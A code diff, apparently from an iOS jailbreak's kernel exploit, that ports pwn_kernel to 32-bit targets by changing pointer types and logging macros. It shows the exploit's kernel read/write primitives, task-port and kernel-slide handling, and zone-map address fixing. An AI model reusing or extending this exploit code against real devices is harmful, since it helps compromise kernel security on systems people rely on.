@@ -51,7 +51,7 @@ typedef struct
 } mach_msg_data_buffer_t;
 
 kern_return_t (^kcall)(uint64_t, int, ...);
-uint64_t (^zonemap_fix_addr)(uint64_t);
+kptr_t (^zonemap_fix_addr)(kptr_t);
 
 void (^kreadbuf)(uint64_t, void*, size_t);
 void (^kwritebuf)(uint64_t, void*, size_t);
@@ -311,6 +311,11 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t* tfp0, kptr_t* kbase, void* c
         sendLog(controller, [NSString stringWithFormat:@__VA_ARGS__]); \
         LOG(__VA_ARGS__);                                              \
     } while (0)
+#ifdef __LP64__
+#define PWN_LOG_KPTR(...) PWN_LOG("%s %llx", __VA_ARGS__)
+#else
+#define PWN_LOG_KPTR(...) PWN_LOG("%s %x", __VA_ARGS__)
+#endif
 #define updateStage(stage) PWN_LOG("Jailbreaking... (%d/21)", stage)
 
     updateStage(1);
@@ -320,14 +325,18 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t* tfp0, kptr_t* kbase, void* c
     if (!kdata)
         goto out;
 
-    PWN_LOG("our kdata buffer is at: %llx", kdata);
+    PWN_LOG_KPTR("our kdata buffer is at:", kdata);
 
     // note to friends, family, next of kin, hackers alike:
     // host_page_size - returns the userland page size, *always* 16K
     // _host_page_size - MIG call, traps to kernel, returns PAGE_SIZE macro, will return the correct page size
     vm_size_t pgsize = 0x0;
     _host_page_size(mach_host_self(), &pgsize);
+#ifdef __LP64__
     PWN_LOG("page size: 0x%lx", pgsize);
+#else
+    PWN_LOG("page size: 0x%x", pgsize);
+#endif
 
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     if (service == MACH_PORT_NULL) {
@@ -755,11 +764,11 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t* tfp0, kptr_t* kbase, void* c
     // lck_rw_t = uintptr_t opaque[2] = unsigned long opaque[2]
     kreadbuf(zone_map_addr + (sizeof(unsigned long) * 2), (void*)&zm_hdr, sizeof(zm_hdr));
 
-    PWN_LOG("zmap start: %llx", zm_hdr.start);
-    PWN_LOG("zmap end: %llx", zm_hdr.end);
+    PWN_LOG_KPTR("zmap start:", zm_hdr.start);
+    PWN_LOG_KPTR("zmap end:", zm_hdr.end);
 
-    uint64_t zm_size = zm_hdr.end - zm_hdr.start;
-    PWN_LOG("zmap size: %llx", zm_size);
+    kptr_t zm_size = zm_hdr.end - zm_hdr.start;
+    PWN_LOG_KPTR("zmap size:", zm_size);
 
     if (zm_size > 0x100000000) {
         PWN_LOG("zonemap too large :/");
@@ -767,9 +776,13 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t* tfp0, kptr_t* kbase, void* c
         goto out;
     }
 
-    zonemap_fix_addr = ^(uint64_t addr) {
-        uint64_t spelunk = (zm_hdr.start & 0xffffffff00000000) | (addr & 0xffffffff);
-        return spelunk < zm_hdr.start ? spelunk + 0x100000000 : spelunk;
+    zonemap_fix_addr = ^(kptr_t addr) {
+#ifdef __LP64__
+        uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | (addr & 0xffffffff);
+        return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
+#else
+        return addr;
+#endif
     };
 
     uint64_t kern_task_addr = kread64(offsets.data.kernel_task + kslide);
